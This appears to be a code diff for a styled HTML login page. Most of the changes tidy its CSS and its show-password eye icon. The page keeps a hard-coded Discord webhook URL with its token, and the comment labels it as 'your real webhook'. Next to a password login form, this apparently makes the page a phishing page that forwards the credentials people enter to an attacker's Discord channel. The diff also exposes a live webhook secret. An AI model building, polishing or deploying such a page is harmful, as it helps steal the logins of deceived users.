@@ -7,7 +7,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <!-- Font Awesome para ícone de olho que funciona em todos os navegadores -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
   
   <style>
@@ -35,22 +34,10 @@
       text-align: center;
       box-shadow: 0 20px 60px rgba(0,0,0,0.6);
     }
-    .logo {
-      width: 180px;
-      margin: 0 auto 36px;
-      filter: drop-shadow(0 4px 12px rgba(0, 170, 255, 0.4));
-    }
-    h1 {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      color: #ffffff;
-    }
-    .subtitle {
-      color: #a0a0a8;
-      font-size: 15px;
-      margin-bottom: 32px;
-    }
+    .logo { width: 180px; margin: 0 auto 36px; filter: drop-shadow(0 4px 12px rgba(0, 170, 255, 0.4)); }
+    h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #ffffff; }
+    .subtitle { color: #a0a0a8; font-size: 15px; margin-bottom: 32px; }
+    
     .input-group {
       margin-bottom: 20px;
       text-align: left;
@@ -65,7 +52,7 @@
     }
     input {
       width: 100%;
-      padding: 14px 44px 14px 16px; /* espaço à direita para o ícone de olho */
+      padding: 14px 50px 14px 16px; /* mais espaço à direita pro ícone */
       border: 1px solid #444;
       border-radius: 8px;
       background: #1a1a1f;
@@ -80,21 +67,24 @@
     }
     .eye-icon {
       position: absolute;
-      right: 16px;
-      top: 50%;
+      right: 18px; /* ajustado para ficar centralizado */
+      top: calc(50% + 2px); /* compensa offset vertical no mobile */
       transform: translateY(-50%);
       font-size: 20px;
       color: #a0a0a8;
       cursor: pointer;
       user-select: none;
       transition: color 0.2s;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
     }
-    .eye-icon:hover {
-      color: #ffffff;
-    }
-    .eye-icon i {
-      pointer-events: none;
-    }
+    .eye-icon:hover { color: #ffffff; }
+    .eye-icon i { pointer-events: none; }
+    
     .btn-login {
       width: 100%;
       padding: 16px;
@@ -127,36 +117,13 @@
       transition: all 0.4s ease;
       pointer-events: none;
     }
-    .error-message.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
-    .links {
-      margin-top: 28px;
-      font-size: 14px;
-    }
-    .links a {
-      color: #00a2ff;
-      text-decoration: none;
-      margin: 0 12px;
-    }
-    .links a:hover {
-      text-decoration: underline;
-    }
-    .footer {
-      margin-top: 40px;
-      font-size: 12px;
-      color: #606068;
-    }
-    .disclaimer {
-      margin-top: 24px;
-      font-size: 13px;
-      color: #707078;
-      line-height: 1.4;
-    }
-    .disclaimer strong {
-      color: #a0a0a8;
-    }
+    .error-message.show { opacity: 1; transform: translateY(0); }
+    .links { margin-top: 28px; font-size: 14px; }
+    .links a { color: #00a2ff; text-decoration: none; margin: 0 12px; }
+    .links a:hover { text-decoration: underline; }
+    .footer { margin-top: 40px; font-size: 12px; color: #606068; }
+    .disclaimer { margin-top: 24px; font-size: 13px; color: #707078; line-height: 1.4; }
+    .disclaimer strong { color: #a0a0a8; }
   </style>
 </head>
 <body>
@@ -208,10 +175,10 @@
     const form = document.getElementById('loginForm');
     const errorMsg = document.getElementById('errorMsg');
     
-    // Substitua pelo seu webhook real do Discord
+    // Seu webhook real aqui
     const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';
 
-    // Toggle mostrar/esconder senha
+    // Toggle olho
     const passwordInput = document.getElementById('password');
     const eyeIcon = document.getElementById('eyeIcon');
 
